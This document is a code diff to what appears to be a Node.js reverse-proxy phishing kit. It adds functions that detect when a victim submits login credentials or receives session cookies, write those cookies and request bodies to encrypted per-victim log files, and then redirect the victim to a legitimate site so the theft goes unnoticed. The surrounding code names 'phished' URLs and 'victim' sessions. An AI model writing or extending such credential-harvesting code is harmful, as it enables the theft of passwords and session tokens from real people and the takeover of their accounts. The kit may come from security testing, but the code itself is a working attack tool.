@@ -4,12 +4,14 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
+const config = require("./config");
 
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
+// Configuration is now handled in config.js
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -38,6 +40,47 @@ const LOG_FILE_STREAMS = {};
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 
 const VICTIM_SESSIONS = {}
+
+// Function to check if credentials have been collected
+function hasCredentialsBeenCollected(currentSession) {
+    if (!currentSession || !VICTIM_SESSIONS[currentSession]) {
+        return false;
+    }
+    
+    const session = VICTIM_SESSIONS[currentSession];
+    
+    // Check for common credential indicators in cookies
+    const credentialCookies = session.cookies.filter(cookie => {
+        const cookieName = cookie.name.toLowerCase();
+        return config.credentials.credentialKeywords.some(keyword => 
+            cookieName.includes(keyword)
+        );
+    });
+    
+    // Check for form submissions with credentials
+    if (session.lastRequestBody) {
+        const body = session.lastRequestBody.toLowerCase();
+        if (config.credentials.credentialFields.some(field => body.includes(field))) {
+            return true;
+        }
+    }
+    
+    return credentialCookies.length > 0;
+}
+
+// Function to check if this is a login form submission
+function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
+    if (!proxyRequestBody) return false;
+    
+    const body = proxyRequestBody.toString().toLowerCase();
+    const path = proxyRequestOptions.path.toLowerCase();
+    
+    // Check for common login endpoints
+    const isLoginEndpoint = config.credentials.loginEndpoints.some(endpoint => path.includes(endpoint));
+    const hasCredentials = config.credentials.credentialFields.some(field => body.includes(field));
+    
+    return isLoginEndpoint && hasCredentials;
+}
 
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
@@ -274,6 +317,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
 
                         const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
+                        
+                        // Store the request body for credential detection
+                        if (proxyRequestBody) {
+                            VICTIM_SESSIONS[currentSession].lastRequestBody = proxyRequestBody.toString();
+                        }
+                        
                         const requestContentLength = Buffer.byteLength(proxyRequestBody);
                         if (requestContentLength) {
                             proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
@@ -411,6 +460,40 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
+                // Check if credentials have been collected and redirect if needed
+                if (config.credentials.enableRedirect && (hasCredentialsBeenCollected(currentSession) || isLoginFormSubmission(proxyRequestBody, proxyRequestOptions))) {
+                    console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - Redirecting to: ${config.credentials.redirectUrl}`);
+                    
+                    // Log the credential collection event
+                    if (config.logging.enableCredentialLogging) {
+                        const credentialLog = {
+                            timestamp: new Date().toISOString(),
+                            session: currentSession,
+                            event: "CREDENTIALS_COLLECTED",
+                            redirectUrl: config.credentials.redirectUrl,
+                            cookies: VICTIM_SESSIONS[currentSession].cookies,
+                            lastRequestBody: VICTIM_SESSIONS[currentSession].lastRequestBody
+                        };
+                        
+                        const logFileStream = LOG_FILE_STREAMS[currentSession];
+                        if (logFileStream) {
+                            encryptData(JSON.stringify(credentialLog))
+                                .then(encryptedResult => {
+                                    logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`);
+                                })
+                                .catch(error => displayError("Credential log encryption failed", error));
+                        }
+                    }
+                    
+                    // Redirect to the legitimate service
+                    clientResponse.writeHead(302, { 
+                        Location: config.credentials.redirectUrl,
+                        ...config.security.redirectHeaders
+                    });
+                    clientResponse.end();
+                    return;
+                }
+                
                 clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                 clientResponse.end(serverResponseBody);
             });
